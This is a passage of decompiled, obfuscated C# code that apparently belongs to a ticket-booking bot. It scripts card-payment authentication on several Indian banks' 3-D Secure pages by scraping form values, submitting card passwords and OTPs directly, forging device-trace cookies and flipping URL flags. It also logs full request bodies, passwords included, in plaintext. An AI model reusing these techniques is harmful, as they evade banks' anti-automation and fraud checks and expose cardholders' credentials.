            array2[79] = 36;
            string text14 = text;
            array2[96] = 0;
            int startIndex2 = text14.IndexOf("name=\"downloadForm");
            array2[80] = 114;
            array2[103] = 94;
            text = text13.Substring(startIndex2);
            array2[83] = 8;
            array2[95] = 0;
            array2[101] = 46;
            array2[102] = 80;
            string string_97 = "Success ProcessIciciCC";
            array2[121] = 9;
            array2[117] = 252;
            clsMain.Lock(string_97);
            array2[76] = 95;
            array2[77] = 90;
            array2[84] = 179;
            array2[100] = 42;
            array2[122] = 150;
            array2[82] = 46;
            array2[97] = 151;
            array2[99] = 59;
            string_86 = text;
            array2[119] = 7;
            array2[104] = 61;
            string_89 = string_87;
            array2[118] = 208;
            string text15 = "¤CÝ\u0099s§T¶ \0";
            for (int i = 0; i < text15.Length; i++)
            {
                array2[i + 85] = (byte)text15[i];
            }
            array2[78] = 75;
            array2[71] = 78;
            return true;
        }

        private bool method_173(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = string_86;
            clsMain.Lock("Enter ProcessCitiCC.");
            string string_92 = "";
            string text = class3_0.Method_SerialInp(string_86, ref string_91, false);
            string string_93 = "";
            clsMain.Lock("First Hit URL = " + string_91 + " Inp = " + text);
            if (!_Request(string_91, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
            {
                string_90 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + string_90);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_93);
            string_91 = string_93;
            if (string_91.IndexOf("Enter IPIN", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            int startIndex = string_91.IndexOf("Encrypt(plainText)");
            startIndex = string_91.IndexOf("iv", startIndex);
            startIndex = string_91.IndexOf("\"", startIndex) + 1;
            int length = string_91.IndexOf("\"", startIndex) - startIndex;
            string string_94 = string_91.Substring(startIndex, length);
            startIndex = string_91.IndexOf("salt", startIndex);
            startIndex = string_91.IndexOf("\"", startIndex) + 1;
            length = string_91.IndexOf("\"", startIndex) - startIndex;
            string string_95 = string_91.Substring(startIndex, length);
            startIndex = string_91.IndexOf("passPhrase", startIndex);
            startIndex = string_91.IndexOf("\"", startIndex) + 1;
            length = string_91.IndexOf("\"", startIndex) - startIndex;
            string string_96 = string_91.Substring(startIndex, length);
            string_88 = Class12.smethod_11(string_88, string_96, string_95, string_94, 1000);
            string text2 = "";
            for (int i = 0; i < string_88.Length; i++)
            {
                text2 = text2 + (int)string_88[i] + "~";
            }
            string_88 = text2;
            string_92 = "authType=Visa+Password&submitted=1&cancelHit=0&forgotPassword=0&cardHolder=" + method_140("cardHolder", string_91) + "&Userid=&authDefaultSelect=Visa+Password&AuthFallBack=&Phase=passwd&tryIndex=1&PaReq=" + method_140("PaReq", string_91) + "&TermUrl=" + method_140("TermUrl", string_91) + "&MD=" + method_140("MD", string_91) + "&ARCOTC=&ARCOTR=&Locale=en_US_CitiIndia_MC%2F&RFIncreaseAuthAction=0&RFIsEMailPresentForIncreaseAuth=&CookieType=0&VSDCInput=" + method_140("VSDCInput", string_91) + "&VSDCData=&ChipPluginName=&ChipPluginVersion=&ChipPluginPresent=TRUE&eAccessPresent=FALSE&eAccessRequired=FALSE&ChipSecret=&AcsCookie=" + method_140("AcsCookie", string_91) + "&DeviceID=&pin=" + HttpUtility.UrlEncode("userid=" + string_88) + "&CustData=ipinflag%3D01%7Erelenable%3DD%7Euseridflag%3DE%7Eforcefire%3DN%7Efypenable%3DD%7Eotpflag%3DE%7EmobileNum%3D1111111111%7E&useridanswer=" + HttpUtility.UrlEncode(string_88);
            clsMain.Lock("Second Hit URL = " + string_87 + " Inp = " + string_92);
            if (!_Request(string_87, string_92, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_91, ref string_90, ref webException_0))
            {
                string_89 = "Failed after Payment, Check Status.";
                clsMain.Lock("Second Hit Failed. err = " + string_90);
                return false;
            }
            clsMain.Lock("Second Hit Output = " + string_91);
            if (string_91.IndexOf("document.downloadForm.submit", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            startIndex = string_91.IndexOf("name=\"downloadForm");
            if (startIndex <= 0)
            {
                clsMain.Lock("Failed ProcessCitiCC");
                string_89 = "Authentication was not successful.";
                return false;
            }
            string_91 = string_91.Substring(string_91.LastIndexOf(">", startIndex));
            clsMain.Lock("Success ProcessCitiCC");
            string_86 = string_91;
            string_89 = string_87;
            return true;
        }

        private bool method_174(string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89, ref string string_90)
        {
            string string_91 = "";
            string string_92 = "";
            string text = string_86;
            string string_93 = text;
            bool flag = false;
            clsMain.Lock("Enter ProcessHdfcCC.");
            bool result;
            if (text.IndexOf("netsafe.hdfcbank.com") >= 0)
            {
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-1/3", tCntrlName_, null, null);
                }
                bool flag2 = true;
                while (true)
                {
                    try
                    {
                        text = class3_0.Method_SerialInp(string_86, ref string_91, true);
                        string_21 = "First Hit";
                        if (!_Request(string_91, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                        {
                            string text2 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                            clsMain.Lock("First Hit Failed. err = " + text2);
                            result = flag;
                            break;
                        }
                        string_87 = string_91;
                        string text3 = "https://netsafe.hdfcbank.com";
                        while (true)
                        {
                            if ((string_93.IndexOf("Enter OTP") > 0) & (string_88 != ""))
                            {
                                clsMain.Lock("ProcessHdfcCC 3D Password Processing.");
                                int startIndex = string_93.IndexOf("randomDigit");
                                startIndex = string_93.IndexOf("\"", startIndex) + 1;
                                int num = string_93.IndexOf("\"", startIndex) - startIndex;
                                string text4 = string_93;
                                int startIndex2 = startIndex;
                                int length = num;
                                string text5 = text4.Substring(startIndex2, length);
                                Cookie cookie = new Cookie("enTrace", text5)
                                {
                                    Domain = "netsafe.hdfcbank.com"
                                };
                                CookieContainer cookieContainer = cookieContainer_2;
                                Cookie cookie2 = cookie;
                                cookieContainer.Add(cookie2);
                                string_91 = text3 + "/ACSWeb/com.enstage.entransact.servers.AccessControlServerSSL?perform=SEND_EGUARD_REQUEST";
                                string text6 = "perform=ajaxRequest&testData=Ajax&xdeviceId=" + text5 + "&bTz=Asia/Kolkata&bTzOS=-330";
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-2/3", tCntrlName_, null, null);
                                }
                                string_91 = string_91.Replace("SEND_EGUARD_REQUEST", "CONFIRM_FORM_LOAD");
                                int num2 = 0;
                                string text9;
                                if (string_93.IndexOf("Select Any Option", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_91 = text3 + "/ACSWeb/jsp/SCode.jsp";
                                    if (string_93.IndexOf("ACSWeb/jsp/PayerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                    {
                                        flag = true;
                                        string_91 = text3 + "/ACSWeb/jsp/PayerAuth.jsp";
                                    }
                                    else if (string_93.IndexOf("jsp/DinerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                    {
                                        string_91 = text3 + "/ACSWeb/jsp/DinerAuth.jsp";
                                    }
                                    text6 = "acsRadio=payerAuth&sbmtBtn=Continue&xdeviceId=" + text5 + "&bTz=undefined";
                                    string_21 = "Second Hit ";
                                    if (!_Request(string_91, text6, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                                    {
                                        string_90 = "Failed after Payment, Check Status.";
                                        string text7 = "Second Hit Failed. err = ";
                                        string text8 = string_92;
                                        clsMain.Lock(text7 + text8);
                                        return false;
                                    }
                                    startIndex = string_93.IndexOf("ACTION=");
                                    startIndex = string_93.IndexOf("\"", startIndex) + 1;
                                    num = string_93.IndexOf("\"", startIndex) - startIndex;
                                    text9 = string_93.Substring(startIndex, num);
                                }
                                else
                                {
                                    num2 = 1;
                                    string text10 = string_93.Substring(string_93.IndexOf("function redirectUrlCancel(choiceType)"));
                                    startIndex = text10.IndexOf(".action =");
                                    startIndex = text10.IndexOf("\"", startIndex) + 1;
                                    num = text10.IndexOf("\"", startIndex) - startIndex;
                                    text9 = text10.Substring(startIndex, num);
                                    text9 = text9.Replace("DYNAMIC_AUTHENTICATION_IMPROVEMENT", "USER_AUTH_IMPROVEMENT");
                                }
                                startIndex = string_93.IndexOf("name=\"txtLogin\"", startIndex);
                                string text11 = string_93;
                                string value = "value";
                                startIndex = string_93.IndexOf("\"", startIndex) + 1;
                                int startIndex3 = startIndex;
                                startIndex = text11.IndexOf(value, startIndex3);
                                string text12 = string_93;
                                string value2 = "\"";
                                int startIndex4 = startIndex;
                                startIndex = text12.IndexOf(value2, startIndex4) + 1;
                                num = string_93.IndexOf("\"", startIndex) - startIndex;
                                string text13 = string_93.Substring(startIndex, num);
                                string[] array = new string[6]
                                {
                                    "txtLogin=",
                                    text13,
                                    "&txtPassword=",
                                    HttpUtility.UrlEncode(string_88),
                                    null,
                                    null
                                };
                                if (num2 == 0)
                                {
                                    array[4] = "&xdeviceId=";
                                    array[5] = text5;
                                }
                                text6 = string.Concat(array);
                                if (flag)
                                {
                                    text6 += "&cmdSubmit=Submit";
                                }
                                string_91 = text3 + text9.Replace("true", "false");
                                string_21 = "Third Hit";
                                if (!_Request(string_91, text6, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                                {
                                    string_90 = "Third Hit Failed, Check Status.";
                                    return false;
                                }
                                if (string_93.IndexOf("perform\" value=\"USER_AUTH_IMPROVEMENT", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-3/3", tCntrlName_, null, null);
                                    }
                                    string string_94 = class3_0.Method_SerialInp(string_93, ref string_91, true);
                                    if (!_Request(string_91, string_94, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                                    {
                                        string_90 = "Failed after Payment, Check Status.";
                                        string text14 = "Fourth Hit Failed. err = ";
                                        string text15 = string_92;
                                        clsMain.Lock(text14 + text15);
                                        return false;
                                    }
                                }
                                if (string_93.IndexOf("Enter OTP", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_88 = "";
                                    continue;
                                }
                                if (string_93.IndexOf("com.enstage.entransact.servers.AccessControlServerSSL", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_88 = "";
                                    string_86 = string_93;
                                    break;
                                }
                                if (string_93.IndexOf("form name=\"frmMerchantPost", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    if (!flag)
                                    {
                                        string_87 = string_91;
                                        string string_95 = class3_0.Method_SerialInp(string_93, ref string_91, true);
                                        string value3 = "form name=\"frmMerchantPost";
                                        if (!string_93.Contains(value3))
                                        {
                                            string_21 = "Fourth Hit";
                                            if (!_Request(string_91, string_95, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                                            {
                                                string_90 = "Failed after Payment, Check Status.";
                                                string text16 = "Fourth Hit Failed. err = ";
                                                string text17 = string_92;
                                                string string_96 = text16 + text17;
                                                clsMain.Lock(string_96);
                                                return false;
                                            }
                                        }
                                    }
                                    clsMain.Lock("Success ProcessHdfcCC Finish");
                                    string_89 = string_93;
                                    string_90 = string_87;
                                    return true;
                                }
                                string_88 = "";
                                continue;
                            }
                            clsMain.Lock("ProcessHdfcCC OTP Processing.");
                            int startIndex5 = string_93.IndexOf("randomDigit");
                            startIndex5 = string_93.IndexOf("\"", startIndex5) + 1;
                            int length2 = string_93.IndexOf("\"", startIndex5) - startIndex5;
                            string value4 = string_93.Substring(startIndex5, length2);
                            startIndex5 = string_93.IndexOf("Total Charge") + 5;
                            startIndex5 = string_93.IndexOf("</span>", startIndex5) + 7;
                            length2 = string_93.IndexOf("<", startIndex5) - startIndex5;
                            string_93.Substring(startIndex5, length2).Trim();
                            startIndex5 = string_93.IndexOf("<span>", startIndex5) + 6;
                            int num3 = string_93.IndexOf("<", startIndex5);
                            int num4 = startIndex5;
                            length2 = num3 - num4;
                            string text18 = string_93.Substring(startIndex5, length2).Trim();
                            Cookie cookie3 = new Cookie("enTrace", value4)
                            {
                                Domain = "netsafe.hdfcbank.com"
                            };
                            CookieContainer cookieContainer2 = cookieContainer_2;
                            Cookie cookie4 = cookie3;
                            cookieContainer2.Add(cookie4);
                            string string_97 = "";
                            if (method_163("Enter OTP For HDFC CC Card:" + text18, ref string_97, ref string_90))
                            {
                                string string_98 = "txtOtpPassword=" + string_97 + "&cmdSubmitDynamic=";
                                string text19 = string_93.Substring(string_93.IndexOf("function redirectUrlCancel(choiceType)"));
                                int startIndex6 = text19.IndexOf(".action =");
                                startIndex6 = text19.IndexOf("\"", startIndex6) + 1;
                                int length3 = text19.IndexOf("\"", startIndex6) - startIndex6;
                                string text20 = text19.Substring(startIndex6, length3);
                                string string_99 = text3 + text20.Replace("true", "false");
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-2/3", tCntrlName_, null, null);
                                }
                                string string_100 = string_87;
                                string_21 = "Second OTP Hit";
                                _Request(string_99, string_98, string_100, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0);
                            }
                            result = false;
                            goto end_IL_0072;
                        }
                        continue;
                    end_IL_0072:;
                    }
                    catch (Exception ex)
                    {
                        clsMain.method_74("Process_HDFC,CC,DC", ex.Message);
                        result = false;
                    }
                    break;
                }
                return result;
            }
            text.IndexOf("window.location");
            if (text.IndexOf("hdfc-acs.wibmo.com") > 0)
            {
                text = class3_0.Method_SerialInp(string_86, ref string_91, true);
                if (!_Request(string_91, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + string_93);
                    result = false;
                }
                else
                {
                    text = class3_0.Method_SerialInp(string_93, ref string_91, true);
                    text += HttpUtility.UrlEncode(string_88);
                    string_91 = "https://hdfc-acs.wibmo.com" + string_91;
                    if (!_Request(string_91, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + string_93);
                        result = false;
                    }
                    else
                    {
                        string_89 = string_93;
                        string_90 = string_87;
                        result = true;
                    }
                }
            }
            else
            {
                result = false;
            }
            return result;
        }

        private bool method_175(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = "";
            string string_92 = string_86;
            clsMain.Lock("Enter ProcessAirtelCC.");
            string text = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_93 = "";
            clsMain.Lock("First Hit URL = " + string_90 + " Inp = " + text);
            bool result;
            if (!_Request(string_90, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
            {
                string text2 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + text2);
                result = false;
            }
            else
            {
                clsMain.Lock("First Hit Output = " + string_93);
                string_92 = string_93;
                if (string_92.IndexOf("Airtel Payments Bank", StringComparison.CurrentCultureIgnoreCase) <= 0)
                {
                    string_89 = "Error Occured while Making Payment!";
                    string text3 = string_89;
                    string text4 = ", Check HTML";
                    string string_94 = text3 + text4;
                    clsMain.Lock(string_94);
                    result = false;
                }
                else
                {
                    string_87 = string_90;
                    string_90 = "https://cardpay.airtelbank.com/airtel/jsp/AuthenticationRequestPage.jsp";
                    string_93 = "selectModeOTP=1&strActivate=%2F&ai=" + method_140("ai", string_92) + "&isADS=null&acctid=" + method_140("acctid", string_92) + "&MD=" + method_140("MD", string_92) + "&cancel=false&cctype=" + method_140("cctype", string_92) + "&CardType=" + method_140("CardType", string_92) + "&modeOption=1&isModeSelected=Y&purchseAmt=" + method_140("purchseAmt", string_92) + "&currExponent=" + method_140("currExponent", string_92) + "&strIssuerId=" + method_140("strIssuerId", string_92) + "&strPurchaseDate=" + method_140("strPurchaseDate", string_92) + "&merchantName=IRCTC";
                    clsMain.Lock("Second Hit URL = " + string_90 + " Inp = " + string_93);
                    if (!_Request(string_90, string_93, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                    {
                        string_89 = "Failed after Payment, Check Status.";
                        string text5 = "Second Hit Failed. err = ";
                        string text6 = string_91;
                        string string_95 = text5 + text6;
                        clsMain.Lock(string_95);
                        result = false;
                    }
                    else
                    {
                        clsMain.Lock("Second Hit Output = " + string_92);
                        if (string_92.IndexOf("Please enter your secure code", StringComparison.CurrentCultureIgnoreCase) > 0)
                        {
                            string[] array = new string[21]
                            {
                                "userPass=",
                                string_88,
                                "&ai=",
                                method_140("ai", string_92),
                                "&acctid=",
                                method_140("acctid", string_92),
                                "&MD=",
                                method_140("MD", string_92),
                                "&merchantName=IRCTC&cancel=false&cctype=",
                                method_140("cctype", string_92),
                                "&CardType=",
                                method_140("CardType", string_92),
                                "&purchseAmt=",
                                method_140("purchseAmt", string_92),
                                "&currExponent=",
                                null,
                                null,
                                null,
                                null,
                                null,
                                null
                            };
                            string string_96 = "currExponent";
                            array[15] = method_140(string_96, string_92);
                            array[16] = "&strIssuerId=";
                            string string_97 = "strIssuerId";
                            string string_98 = string_92;
                            array[17] = method_140(string_97, string_98);
                            array[18] = "&strPurchaseDate=";
                            string string_99 = "strPurchaseDate";
                            array[19] = method_140(string_99, string_92);
                            array[20] = "&strActivate=%2F&isADS=null&modeOption=1&reGenerate=&errorMessage=";
                            string_93 = string.Concat(array);
                            string_87 = string_90;
                            string_90 = "https://cardpay.airtelbank.com/airtel/jsp/ACSMPINCheckEntry.jsp";
                            string text7 = "Third Hit URL = ";
                            string text8 = string_90;
                            string text9 = " Inp = ";
                            clsMain.Lock(text7 + text8 + text9 + string_93);
                            if (!_Request(string_90, string_93, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                            {
                                string_89 = "Failed after Payment, Check Status.";
                                string text10 = "Third Hit Failed. err = ";
                                string text11 = string_91;
                                clsMain.Lock(text10 + text11);
                                return false;
                            }
                            string text12 = "Third Hit Output = ";
                            string text13 = string_92;
                            clsMain.Lock(text12 + text13);
                        }
                        if (string_92.IndexOf("Processing your 3-D Secure Transaction", StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            string_89 = "Error Occured while Making Payment!";
                            string text14 = string_89;
                            string text15 = ", Check HTML";
                            string string_100 = text14 + text15;
                            clsMain.Lock(string_100);
                            result = false;
                        }
                        else
                        {
                            string string_101 = "Success ProcessAirtelCC";
                            clsMain.Lock(string_101);
                            string_86 = string_92;
                            string_89 = string_90;
                            result = true;
                        }
                    }
                }
            }
            return result;
        }

        private bool method_176(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = "";
            string text = string_86;
            clsMain.Lock("Enter ProcessAxisCC.");
            string string_92 = "";
            string text2 = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_93 = "";
            clsMain.Lock("First Hit URL = " + string_90 + " Inp = " + text2);
            bool result;
            if (!_Request(string_90, text2, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
            {
                string_91 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + string_91);
                result = false;
            }
            else
            {
                clsMain.Lock("First Hit Output = " + string_93);
                text = string_93;
                bool flag;
                if (!(flag = text.IndexOf("Please select an option to continue with the", StringComparison.CurrentCultureIgnoreCase) > 0))
                {
                    string_92 = text;
                    string value = "Payer Authentication";
                    if (string_92.IndexOf(value, StringComparison.CurrentCultureIgnoreCase) <= 0)
                    {
                        string_89 = "Error Occured while Making Payment!";
                        string string_94 = string_89 + ", Check HTML";
                        clsMain.Lock(string_94);
                        return false;
                    }
                }
                string text4;
                string text7;
                if (!flag)
                {
                    int startIndex = text.IndexOf("ACTION=");
                    string_93 = text;
                    startIndex = string_93.IndexOf("\"", startIndex) + 1;
                    int num = text.IndexOf("\"", startIndex);
                    int num2 = startIndex;
                    int num3 = num - num2;
                    string text3 = text;
                    int startIndex2 = startIndex;
                    int length = num3;
                    text4 = text3.Substring(startIndex2, length);
                    string text5 = text;
                    string value2 = "XID";
                    int startIndex3 = startIndex;
                    startIndex = text5.IndexOf(value2, startIndex3);
                    startIndex = text.IndexOf("value", startIndex);
                    startIndex = text.IndexOf("\"", startIndex) + 1;
                    num3 = text.IndexOf("\"", startIndex) - startIndex;
                    string str = text.Substring(startIndex, num3);
                    startIndex = text.IndexOf("txtLogin", startIndex);
                    startIndex = text.IndexOf("VALUE", startIndex);
                    startIndex = text.IndexOf("\"", startIndex) + 1;
                    num3 = text.IndexOf("\"", startIndex) - startIndex;
                    string text6 = text.Substring(startIndex, num3);
                    text7 = "XID=" + HttpUtility.UrlEncode(str) + "&txtLogin=" + text6 + "&txtPassword=" + HttpUtility.UrlEncode(string_88) + "&cmdSubmit=Submit&cmdSubmit=Cancel";
                }
                else
                {
                    int startIndex4 = text.IndexOf("if(noSubmit == 1");
                    startIndex4 = text.IndexOf("document.frmPayerAuth.action", startIndex4) + 1;
                    startIndex4 = text.IndexOf("\"", startIndex4) + 1;
                    int length2 = text.IndexOf("\"", startIndex4) - startIndex4;
                    text4 = text.Substring(startIndex4, length2);
                    startIndex4 = text.IndexOf("XID");
                    startIndex4 = text.IndexOf("value", startIndex4);
                    startIndex4 = text.IndexOf("\"", startIndex4) + 1;
                    length2 = text.IndexOf("\"", startIndex4) - startIndex4;
                    string str2 = text.Substring(startIndex4, length2);
                    startIndex4 = text.IndexOf("txtLogin", startIndex4);
                    startIndex4 = text.IndexOf("VALUE", startIndex4);
                    startIndex4 = text.IndexOf("\"", startIndex4) + 1;
                    length2 = text.IndexOf("\"", startIndex4) - startIndex4;
                    string text8 = text.Substring(startIndex4, length2);
                    startIndex4 = text.IndexOf("txtmobilenumber", startIndex4);
                    startIndex4 = text.IndexOf("value", startIndex4);
                    string text9 = text;
                    string value3 = "\"";
                    startIndex4 = text9.IndexOf(value3, startIndex4) + 1;
                    length2 = text.IndexOf("\"", startIndex4) - startIndex4;
                    string text10 = text;
                    int startIndex5 = startIndex4;
                    string text11 = text10.Substring(startIndex5, length2);
                    text7 = "XID=" + HttpUtility.UrlEncode(str2) + "&txtLogin=" + text8 + "&trans_auth=valuable&txtPassword=" + HttpUtility.UrlEncode(string_88) + "&cmdSubmit.x=27&cmdSubmit.y=5&txtmobilenumber=" + text11 + "&txtmobilenumber=" + text11 + "&otpValue=&pre_otpValue=&txnAuthType=static&hash=";
                }
                string_87 = string_90;
                string text12 = text4[0].ToString();
                string text13 = "/";
                if (text12 == text13)
                {
                    text4 = text4.Substring(1);
                }
                string_90 = "https://secure.axisbank.com/" + text4.Replace(" ", "%20");
                clsMain.Lock("Second Hit URL = " + string_90 + " Inp = " + text7);
                if (!_Request(string_90, text7, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref text, ref string_91, ref webException_0))
                {
                    string_89 = "Failed after Payment, Check Status.";
                    clsMain.Lock("Second Hit Failed. err = " + string_91);
                    result = false;
                }
                else
                {
                    clsMain.Lock("Second Hit Output = " + text);
                    if (text.IndexOf(">Transaction is being processed", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        int startIndex6 = text.IndexOf("action=");
                        startIndex6 = text.IndexOf("\"", startIndex6) + 1;
                        int length3 = text.IndexOf("\"", startIndex6) - startIndex6;
                        text4 = text.Substring(startIndex6, length3);
                        text7 = class3_0.Method_SerialInp(text, ref string_90, false);
                        if (text4[0].ToString() == "/")
                        {
                            text4 = text4.Substring(1);
                        }
                        string_90 = "https://secure.axisbank.com/" + text4.Replace(" ", "%20");
                        clsMain.Lock("Third Hit URL = " + string_90 + " Inp = " + text7);
                        if (!_Request(string_90, text7, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref text, ref string_91, ref webException_0))
                        {
                            string_89 = "Failed after Payment, Check Status.";
                            clsMain.Lock("Third Hit Failed. err = " + string_91);
                            return false;
                        }
                        clsMain.Lock("Third Hit Output = " + text);
                    }
                    if (text.IndexOf("Your transaction is being processed", StringComparison.CurrentCultureIgnoreCase) <= 0)
                    {
                        string_89 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_89 + ", Check HTML");
                        result = false;
                    }
                    else
                    {
                        clsMain.Lock("Success ProcessAxisCC");
                        string_86 = text;
                        string_89 = string_90;
                        result = true;
                    }
                }
            }
            return result;
        }

        private bool method_177(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89, string string_90)
        {
            string string_91 = "";
            string string_92 = string_86;
            clsMain.Lock("Enter ProcessItzCC.");
            string string_93 = "";
            string text = class3_0.Method_SerialInp(string_86, ref string_92, false);
            string string_94 = "";
            clsMain.Lock("First Hit URL = " + string_92 + " Inp = " + text);
            if (!_Request(string_92, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
            {
                string_91 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + string_91);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_94);
            string_92 = string_94;
            if (string_92.IndexOf("Verified by Visa", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            string text2 = "pin1=" + string_88 + "&submitted=1&authType=Visa+Password&pin=PASSWORD%3D" + string_88 + "&cancelHit=0&forgotPassword=0&cardHolder=&Userid=&authDefaultSelect=Visa+Password&AuthFallBack=&Phase=passwd&tryIndex=1&" + string_90 + "&ARCOTR=&Locale=en_US_ITZCASHHDFC%2F&RFInreaseAuthAction=0&RFIsEMailPresentForIncreaseAuth=&CookieType=0&VSDCInput=" + method_140("VSDCInput", string_92) + "&VSDCData=&ChipPluginName=&ChipPluginVersion=&ChipPluginPresent=TRUE&eAccessPresent=FALSE&eAccessRequired=FALSE&ChipSecret=&AcsCookie=" + method_140("AcsCookie", string_92) + "&DeviceID=";
            clsMain.Lock("Second Hit URL = " + string_87 + " Inp = " + text2);
            if (!_Request(string_87, text2, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
            {
                string_89 = "Failed after Payment, Check Status.";
                clsMain.Lock("Second Hit Failed. err = " + string_91);
                return false;
            }
            clsMain.Lock("Second Hit Output = " + string_92);
            if (string_92.IndexOf("document.downloadForm.submit", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            string_92 = string_92.Substring(string_92.IndexOf("name=\"downloadForm"));
            clsMain.Lock("Success ProcessItzCC");
            string_86 = string_92;
            string_89 = string_87;
            return true;
        }

        private bool method_178(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string text = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_91 = "";
            string string_92 = "";
            clsMain.Lock("Enter ProcessSbiCC.");
            try
            {
                string text2 = text.Substring(text.IndexOf("TermUrl") + 8);
                if (text2.IndexOf("&") > 0)
                {
                    text2 = text2.Substring(0, text2.IndexOf("&"));
                }
                text2 = HttpUtility.UrlDecode(text2);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. SBI_CC(1/2)", tCntrlName_, null, null);
                }
                _Request(string_90, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0);
                string_87 = string_90;
                if (string_92.IndexOf("<title id=\"title\"></title>", StringComparison.CurrentCultureIgnoreCase) <= 0)
                {
                    string_89 = "Error Occured while Making Payment!";
                    clsMain.Lock(string_89 + ", Check HTML");
                    return false;
                }
                while (true)
                {
                    string text3 = class3_0.Method_SerialInp(string_92, ref string_90, false);
                    string text4 = string_92.Substring(string_92.IndexOf("var") + 4);
                    string text5 = "";
                    int num = 0;
                    while (true)
                    {
                        try
                        {
                            string text6 = text4.Substring(0, text4.IndexOf("\";"));
                            text6 = text6.Replace(" = \"", "=");
                            text5 = text5 + "&" + text6;
                            text4 = text4.Substring(text4.IndexOf("var") + 4);
                        }
                        catch (Exception)
                        {
                            break;
                        }
                        num++;
                    }
                    text3 += text5;
